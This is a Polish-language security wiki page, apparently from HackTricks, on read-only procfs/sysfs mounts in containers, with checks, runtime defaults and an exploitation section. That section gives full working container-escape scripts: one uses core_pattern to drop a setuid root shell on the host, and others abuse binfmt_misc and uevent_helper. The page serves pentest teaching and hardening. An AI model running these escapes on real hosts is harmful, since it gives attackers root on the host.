# Ścieżki systemowe tylko do odczytu

{{#include ../../../../banners/hacktricks-training.md}}

Ścieżki systemowe tylko do odczytu są oddzielną ochroną od masked paths. Zamiast całkowicie ukrywać ścieżkę, runtime ją udostępnia, ale montuje jako tylko do odczytu. Jest to powszechne dla wybranych lokalizacji procfs i sysfs, gdzie dostęp do odczytu może być akceptowalny lub operacyjnie konieczny, ale zapisy byłyby zbyt niebezpieczne.

Cel jest prosty: wiele interfejsów jądra staje się znacznie bardziej niebezpiecznych, gdy są zapisywalne. Montowanie jako tylko do odczytu nie usuwa całkowicie wartości rekonesansowej, ale uniemożliwia skompromitowanemu workloadowi modyfikowanie leżących poniżej plików skierowanych do jądra przez tę ścieżkę.

## Działanie

Runtimes często oznaczają części widoku proc/sys jako tylko do odczytu. W zależności od runtime i hosta, może to obejmować ścieżki takie jak:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Rzeczywista lista może się różnić, ale model jest ten sam: zezwolić na widoczność tam, gdzie jest potrzebna, domyślnie zabronić modyfikacji.

## Laboratorium

Sprawdź listę ścieżek tylko do odczytu zadeklarowanych przez Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Sprawdź widok zamontowanego proc/sys wewnątrz kontenera:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Wpływ na bezpieczeństwo

Ścieżki systemowe tylko do odczytu zawężają dużą klasę nadużyć wpływających na hosta. Nawet jeśli atakujący może przeglądać procfs lub sysfs, brak możliwości zapisu tam usuwa wiele bezpośrednich dróg modyfikacji związanych z parametrami jądra, handlerami awarii, pomocnikami ładowania modułów lub innymi interfejsami kontrolnymi. Ekspozycja nie znika, ale przejście od ujawnienia informacji do wpływu na hosta staje się trudniejsze.

## Błędy konfiguracji

Główne błędy to odmaskowywanie lub ponowne montowanie wrażliwych ścieżek jako do zapisu i odczytu, wystawianie zawartości hostowego proc/sys bezpośrednio za pomocą writable bind mounts, lub używanie trybów uprzywilejowanych, które de facto omijają bezpieczniejsze domyślne ustawienia runtime. W Kubernetes, `procMount: Unmasked` i privileged workloads często idą w parze ze słabszą ochroną proc. Innym częstym błędem operacyjnym jest założenie, że ponieważ runtime zazwyczaj montuje te ścieżki jako tylko do odczytu, wszystkie workloads nadal dziedziczą ten domyślny stan.

## Wykorzystanie

Jeśli ochrona jest słaba, zacznij od wyszukania zapisywalnych wpisów proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Gdy występują zapisywalne wpisy, wysokowartościowe dalsze ścieżki obejmują:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Zapisalne wpisy w `/proc/sys` często oznaczają, że kontener może modyfikować zachowanie jądra hosta zamiast jedynie je odczytywać.
- `core_pattern` jest szczególnie ważny, ponieważ zapisywalna wartość skierowana do hosta może zostać wykorzystana jako ścieżka wykonania kodu na hoście poprzez spowodowanie awarii procesu po ustawieniu pipe handler.
- `modprobe` ujawnia helper używany przez jądro dla przepływów związanych z ładowaniem modułów; jest to klasyczny wysokowartościowy cel, gdy jest zapisywalny.
- `binfmt_misc` informuje, czy rejestracja niestandardowego interpretera jest możliwa. Jeśli rejestracja jest zapisywalna, może to stać się prymitywem wykonawczym zamiast tylko leak.
- `panic_on_oom` kontroluje decyzję jądra dotyczącą całego hosta i może więc zamienić wyczerpanie zasobów w host denial of service.
- `uevent_helper` jest jednym z najczystszych przykładów zapisywalnej ścieżki helpera sysfs powodującej wykonanie w kontekście hosta.

Interesujące odkrycia obejmują zapisywalne, skierowane do hosta wpisy proc lub wpisy sysfs, które normalnie powinny być tylko do odczytu. W tym momencie workload przeszedł z ograniczonego widoku kontenera w kierunku znaczącego wpływu na jądro.

### Pełny przykład: ucieczka z hosta przez `core_pattern`

Jeśli `/proc/sys/kernel/core_pattern` jest zapisywalny z wnętrza kontenera i wskazuje na widok jądra hosta, można to wykorzystać do uruchomienia payloadu po awarii:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Jeżeli ścieżka rzeczywiście sięga jądra hosta, ładunek uruchamia się na hoście i zostawia po sobie setuid shell.

### Pełny przykład: rejestracja `binfmt_misc`

Jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny, rejestracja niestandardowego interpretera może spowodować wykonanie kodu, gdy zostanie uruchomiony pasujący plik:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Jeśli `binfmt_misc` dostępny od strony hosta jest zapisywalny, skutkiem może być wykonanie kodu w ścieżce interpretera wywoływanej przez kernel.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest zapisywalny, kernel może wywołać program pomocniczy ze ścieżki hosta, gdy zostanie wyzwolone pasujące zdarzenie:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Powodem, dla którego to jest tak niebezpieczne, jest fakt, że ścieżka pomocnicza jest rozwiązywana z perspektywy systemu plików hosta, a nie z bezpiecznego kontekstu ograniczonego do kontenera.

## Sprawdzenia

Te kontrole określają, czy ekspozycja procfs/sysfs jest tylko do odczytu tam, gdzie powinna być, oraz czy obciążenie nadal może modyfikować wrażliwe interfejsy jądra.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Co jest tu interesujące:

- Normalny utwardzony workload powinien udostępniać bardzo niewiele zapisywalnych wpisów proc/sys.
- Zapisywalne `/proc/sys` ścieżki często są ważniejsze niż zwykły dostęp do odczytu.
- Jeśli runtime deklaruje, że ścieżka jest tylko do odczytu, ale w praktyce jest zapisywalna, dokładnie sprawdź propagację montowania, bind mounts i ustawienia uprawnień.

## Domyślne ustawienia runtime

| Runtime / platforma | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Włączone domyślnie | Docker definiuje domyślną listę ścieżek tylko do odczytu dla wrażliwych wpisów proc | udostępnianie montowań hosta /proc/sys, `--privileged` |
| Podman | Włączone domyślnie | Podman stosuje domyślne ścieżki tylko do odczytu, chyba że zostaną jawnie poluzowane | `--security-opt unmask=ALL`, szerokie montowania hosta, `--privileged` |
| Kubernetes | Dziedziczy domyślne ustawienia runtime | Używa modelu ścieżek tylko do odczytu z niższego poziomu runtime, chyba że zostanie osłabiony ustawieniami Poda lub montowaniami hosta | `procMount: Unmasked`, uprzywilejowane workloady, zapisywalne montowania hosta /proc/sys |
| containerd / CRI-O under Kubernetes | Domyślny dla runtime | Zwykle polega na domyślnych ustawieniach OCI/runtime | tak jak w wierszu Kubernetes; bezpośrednie zmiany konfiguracji runtime mogą osłabić to zachowanie |

Kluczowe jest to, że ścieżki systemowe tylko do odczytu zwykle występują jako domyślne ustawienie runtime, ale łatwo je podważyć przez tryby uprzywilejowane lub montowania hosta (bind mounts).
{{#include ../../../../banners/hacktricks-training.md}}
